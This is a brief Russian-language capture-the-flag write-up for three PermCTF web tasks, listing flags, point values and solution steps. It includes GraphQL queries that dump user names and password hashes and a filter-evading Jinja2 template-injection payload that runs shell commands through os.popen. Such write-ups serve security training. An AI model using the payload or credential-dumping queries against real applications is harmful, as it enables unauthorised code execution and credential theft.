1 таск
ip порт
флаг PermCTF{web_is_easy}
стоимость 100
Краткое решение: открываем по https, смотрим сертификат, находим домены, заходим на домен с флагом
2 таск
ip port
стоимость 150
заходим на другой хост, находим там graphql выполняем запросы находим второй флаг.
```
query{
  allPaths {
    edges {
      node {
        path

      }
    }
  }
}
```
Флаг PermCTF{Gr4phQL}
3 таск
стоимость 200
из graphql находим еще хеш, брутим его и находим пароль s3cur3d и пути dobavitkota
query{
  allUsers {
    edges {
      node {
        name,
        password
      }
    }
  }
}

открываем /dobavitkota
эксплуатируем ssti
```
{{request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("cat flag")["read"]()}}
```
флаг PermCTF{you_are_cool}
